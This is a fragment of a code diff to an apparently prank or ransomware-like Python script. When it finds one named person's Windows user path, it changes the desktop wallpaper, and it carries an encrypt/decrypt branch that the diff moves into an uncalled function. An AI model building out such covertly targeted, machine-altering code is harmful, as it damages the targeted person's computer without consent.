@@ -15,6 +15,8 @@ def apocalypse():
     print("CHANGING BACKGROUND...")
     ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath("arabes.png") , 0)
     print("BACKGROUND CHANGED SUCCESSFULLY")
+
+def no():
     if DECRYPT:
         print("DECRYPTING...")
     else:
@@ -42,3 +44,4 @@ def apocalypse():
 if userPath == 'C:\\Users\\Valérie de Brémand':
     print("TIBO DETECTE")
     apocalypse()
+    #no()
